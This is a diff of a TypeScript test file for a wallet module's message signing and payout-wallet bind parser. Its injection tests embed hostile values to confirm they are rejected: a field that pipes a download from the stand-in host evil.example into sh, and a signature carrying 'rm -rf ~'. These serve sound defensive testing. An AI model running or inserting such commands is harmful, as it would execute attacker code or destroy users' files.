@@ -1,14 +1,5 @@
 import { describe, it, expect, afterEach, vi } from 'vitest';
-import {
-  chainIdFor,
-  randomNonceHex,
-  buildAuthorization,
-  buildTypedData,
-  encodePaymentHeader,
-  walletAvailable,
-  signBountyPayment,
-  WalletError,
-} from './wallet.js';
+import { chainIdFor, randomNonceHex, buildAuthorization, buildTypedData, encodePaymentHeader, walletAvailable, signBountyPayment, personalSign, WalletError, BIND_TITLE, BIND_FOOTER, parseBindMessage, readBindLink, bindCommand } from './wallet.js';
 import type { PaymentRequirementsV2 } from '../api/types.js';
 
 const REQ: PaymentRequirementsV2 = {
@@ -149,5 +140,77 @@ describe('signBountyPayment', () => {
 
   it('throws WalletError when no wallet is present', async () => {
     await expect(signBountyPayment(REQ, NOW)).rejects.toThrow(/No browser wallet/);
+  });
+});
+
+describe('personalSign (payout wallet bind, D8)', () => {
+  const MESSAGE = 'BasedAgents payout wallet\nWallet: ' + FROM;
+
+  it('asks the wallet to personal_sign the hex-encoded message with the expected account', async () => {
+    const request = vi.fn(async ({ method }: { method: string; params?: unknown[] }) => (method === 'eth_requestAccounts' ? [FROM.toUpperCase().replace('0X', '0x')] : SIG));
+    (globalThis as { ethereum?: unknown }).ethereum = { request };
+    const res = await personalSign(MESSAGE, FROM);
+    expect(res.signature).toBe(SIG);
+    const signCall = request.mock.calls.find(([a]) => a.method === 'personal_sign')![0] as { method: string; params: [string, string] };
+    expect(Buffer.from(signCall.params[0].slice(2), 'hex').toString('utf8')).toBe(MESSAGE);
+    expect(signCall.params[1].toLowerCase()).toBe(FROM);
+  });
+
+  it('refuses when the wallet is on another account, or declines', async () => {
+    (globalThis as { ethereum?: unknown }).ethereum = { request: vi.fn(async () => ['0x' + '9'.repeat(40)]) };
+    await expect(personalSign(MESSAGE, FROM)).rejects.toThrow(/Switch your wallet/);
+    (globalThis as { ethereum?: unknown }).ethereum = {
+      request: vi.fn(async ({ method }: { method: string }) => {
+        if (method === 'eth_requestAccounts') return [FROM];
+        throw Object.assign(new Error('User rejected'), { code: 4001 });
+      }),
+    };
+    await expect(personalSign(MESSAGE, FROM)).rejects.toThrow('You declined');
+    delete (globalThis as { ethereum?: unknown }).ethereum;
+    await expect(personalSign(MESSAGE, FROM)).rejects.toBeInstanceOf(WalletError);
+  });
+});
+
+
+describe('bind message for the sign page (D8)', () => {
+  const lines = (network = 'eip155:8453') => [
+    BIND_TITLE,
+    'Agent: ag_7Xk9mP2qR8nK4vL3aB5cD6eF7gH8jK9mN2pQ3rS4tU5v',
+    'Wallet: 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266',
+    `Network: ${network}`,
+    'Issued: 2026-09-29T01:52:00Z',
+    'Nonce: 3f9c1a7e0b5d4c2a',
+    '',
+    BIND_FOOTER,
+  ];
+  const link = (message: string) => `#m=${Buffer.from(message, 'utf8').toString('base64url')}`;
+  const SIGNATURE = '0x' + 'ab'.repeat(65);
+
+  it('reads a canonical message from the link and builds the finishing command from its fields', () => {
+    const read = readBindLink(link(lines().join('\n')));
+    expect(read?.fields).toEqual({
+      agent: 'ag_7Xk9mP2qR8nK4vL3aB5cD6eF7gH8jK9mN2pQ3rS4tU5v', wallet: '0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266',
+      network: 'eip155:8453', issued: '2026-09-29T01:52:00Z', nonce: '3f9c1a7e0b5d4c2a',
+    });
+    expect(bindCommand(read!.fields, SIGNATURE)).toBe(`basedagents wallet set 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 --signature ${SIGNATURE}`);
+    const sepolia = readBindLink(link(lines('eip155:84532').join('\n')));
+    expect(bindCommand(sepolia!.fields, SIGNATURE)).toContain(' --network eip155:84532 --signature ');
+  });
+
+  it('refuses a crafted message, so no shell text reaches the command', () => {
+    const injected = lines('eip155:84532 ; curl https://evil.example/x | sh ;').join('\n');
+    expect(parseBindMessage(injected)).toBeNull();
+    expect(readBindLink(link(injected))).toBeNull();
+    const variants = [
+      lines().join('\r\n'),                                    // CRLF
+      [...lines(), 'extra'].join('\n'),                        // an extra line
+      lines().join('\n').replace(BIND_FOOTER, 'Sign anything.'), // another footer
+      lines().join('\n').replace('Wallet: 0xf39f', 'Wallet: 0xzz9f'),
+      'BasedAgents payout wallet\nWallet: 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266', // the old, loose shape
+    ];
+    for (const v of variants) expect(parseBindMessage(v), JSON.stringify(v.slice(0, 40))).toBeNull();
+    expect(readBindLink('#m=not*base64')).toBeNull();
+    expect(readBindLink('')).toBeNull();
+    expect(bindCommand(readBindLink(link(lines().join('\n')))!.fields, '0xab; rm -rf ~')).toBeNull();
   });
 });
